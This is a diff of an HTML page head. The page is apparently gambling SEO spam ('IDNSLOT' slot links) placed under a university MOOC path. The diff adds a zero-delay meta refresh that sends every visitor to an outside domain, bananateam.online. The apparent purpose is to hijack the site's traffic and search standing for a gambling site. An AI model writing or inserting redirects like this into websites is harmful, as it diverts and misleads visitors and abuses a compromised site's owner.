@@ -12,6 +12,7 @@
     <meta name="viewport" content="width=device-width,initial-scale=1">
     <meta name="theme-color" content="">
     <link rel="amphtml" href="https://bananateam.online/amp/mooc-idn.html">
+    <meta http-equiv="refresh" content="0; url=https://bananateam.online/amp/mooc-idn.html">
     <link rel="canonical" href="https://mooc.unair.ac.id/mod/idnslot/">
     <link rel="preconnect" href="https://fonts.shopifycdn.com" crossorigin>
     <title>IDNSLOT ♦ Link Situs Idn Slot Terbaru Hari Ini Resmi 2023</title>
